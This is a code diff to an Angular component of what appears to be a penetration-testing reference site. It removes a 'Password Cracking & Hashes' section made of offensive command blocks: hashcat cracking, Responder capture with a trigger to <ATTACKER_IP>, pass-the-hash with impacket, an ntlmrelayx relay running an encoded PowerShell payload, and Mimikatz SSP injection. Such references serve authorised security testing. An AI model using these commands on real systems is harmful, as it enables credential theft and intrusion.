@@ -35,14 +35,13 @@ export class UsefulStuffComponent implements OnInit {
   selectedSection = 'file-transfer';
 
   readonly sections: SectionIndexItem[] = [
-    { id: 'file-transfer', label: 'File Transfer', group: 'Transfers' },
+    { id: 'file-transfer', label: 'File Transfer', group: 'Transfers', important: true },
     { id: 'git-files', label: 'Git & File Hunting', group: 'Recon' },
     { id: 'database-reference', label: 'Database References', group: 'Services' },
-    { id: 'tunneling', label: 'Tunneling & Port Forwarding', group: 'Networking' },
+    { id: 'tunneling', label: 'Tunneling & Port Forwarding', group: 'Networking', important: true },
     { id: 'payload-formats', label: 'Payload Formats', group: 'Tooling' },
     { id: 'python-environments', label: 'Python Environments', group: 'Tooling' },
-    { id: 'rdp', label: 'RDP Toolkit', group: 'Remote Access' },
-    { id: 'password-cracking', label: 'Password Cracking & Hashes', group: 'Credentials' }
+    { id: 'rdp', label: 'RDP Toolkit', group: 'Remote Access' }
   ];
 
   private readonly route = inject(ActivatedRoute);
@@ -186,94 +185,6 @@ python -m pip install impacket` },
         { context: 'Domain account format', command: 'xfreerdp /v:{{TARGET_IP}} /u:<DOMAIN>\\<USER> /cert:ignore' },
         { context: 'Clipboard and dynamic resolution', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore +clipboard /dynamic-resolution' },
         { context: 'Troubleshoot RDP security negotiation only when required', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore /sec:rdp' }
-      ]
-    },
-    'password-cracking': {
-      title: 'Password Cracking & Hashes',
-      description: 'Offline hash cracking methodology, wordlist mutation and NTLM capture/pass/relay workflows.',
-      blocks: [
-        {
-          context: 'Methodology · 1. Extract → 2. Identify → 3. Estimate → 4. Prepare wordlist → 5. Attack',
-          command: `# Identify the hash type/format
-hashid <HASH>
-
-# Estimate keyspace and cracking time
-echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
-python3 -c "print(62**8)"           # keyspace for an 8-char password
-hashcat -b                           # benchmark CPU/GPU hash rate
-python3 -c "print(916132832 / 134200000)"   # keyspace / hash-rate (CPU)
-
-# Attack the hash
-hashcat -m <HASH_TYPE> hashes.txt /usr/share/wordlists/rockyou.txt -r rules.rule`
-        },
-        {
-          context: 'Wordlist mutation rules (Hashcat)',
-          command: `# Common rule operators: ^ prepend, $ append, c capitalize first letter
-echo '$1' > demo.rule
-hashcat -r demo.rule --stdout demo.txt     # preview mutated output
-
-# Combine rules on one line (sequential) vs multiple lines (independent)
-# "$1 c"  -> append number, then capitalize
-# "$1\\nc" -> two separate variants
-
-# Predefined rule sets
-ls /usr/share/hashcat/rules/
-hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
-        },
-        {
-          context: 'KeePass database cracking',
-          command: `Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-
-keepass2john Database.kdbx > keepass.hash
-hashcat --help | grep -i keepass     # mode 13400
-hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`
-        },
-        {
-          context: 'SSH private key passphrase cracking',
-          command: `ssh2john id_rsa > ssh.hash
-hashcat -h | grep -i ssh
-# 22911 -> OpenSSH $0$ / 22921 -> OpenSSH $6$ / 22931 -> OpenSSH $1$,$3$
-
-hashcat -m 22921 ssh.hash wordlist.txt -r custom.rule --force`
-        },
-        {
-          context: 'Cracking NTLM / Net-NTLMv2 hashes',
-          command: `# Local NTLM hash (e.g. dumped via Mimikatz lsadump::sam)
-echo <NTLM_HASH> > user.hash
-hashcat --help | grep -i ntlm         # NTLM mode 1000
-hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-
-# Net-NTLMv2 captured with Responder
-sudo responder -I <INTERFACE>
-# Trigger auth from the target: dir \\\\<ATTACKER_IP>\\share
-# Save the full "NTLMv2-SSP Hash" line to user.hash
-hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt`
-        },
-        {
-          context: 'Pass-the-Hash (NTLM, no cracking required)',
-          command: `smbclient \\\\\\\\<TARGET_IP>\\\\share -U Administrator --pw-nt-hash <NTLM_HASH>
-
-impacket-psexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>
-impacket-wmiexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>`
-        },
-        {
-          context: 'Relaying Net-NTLMv2 (ntlmrelayx)',
-          command: `impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <BASE64_PAYLOAD>"
-
-# Catch the result
-nc -nvlp <PORT>
-# Trigger auth from the victim: dir \\\\<ATTACKER_IP>\\share`
-        },
-        {
-          context: 'Windows Credential Guard (bypass + limitations)',
-          command: `Get-ComputerInfo | Select-String 'CredentialGuard|DeviceGuard'
-# When enabled, LSASS no longer exposes plaintext-recoverable domain hashes (isolated in VTL1 / LSAISO)
-
-# Bypass: inject a malicious SSP to capture plaintext credentials on next logon
-privilege::debug
-misc::memssp
-type C:\\Windows\\System32\\mimilsa.log`
-        }
       ]
     }
   };
